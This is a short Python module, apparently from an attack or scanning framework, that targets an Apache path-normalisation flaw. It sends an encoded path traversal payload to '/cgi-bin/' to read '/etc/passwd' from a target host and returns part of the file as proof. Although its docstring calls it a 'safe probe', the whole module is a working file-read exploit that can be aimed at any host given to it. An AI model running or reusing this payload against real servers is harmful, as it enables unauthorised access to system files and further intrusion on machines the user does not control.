#ðŸ“„ modules/apache/normalize_path_rce.py
import requests

def run(target):
    """
    SAFE PROBE â€” pas une exploitation destructive
    """
    try:
        url = f"http://{target}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
        r = requests.get(url, timeout=5)

        if r.status_code == 200 and "root:" in r.text:
            return {
                "status": True,
                "impact": "file_read",
                "proof": "Path traversal confirmed via /etc/passwd",
                "details": r.text[:300]
            }

        return {
            "status": False,
            "proof": "Traversal payload did not succeed"
        }

    except Exception as e:
        return {
            "status": False,
            "proof": str(e)
        }
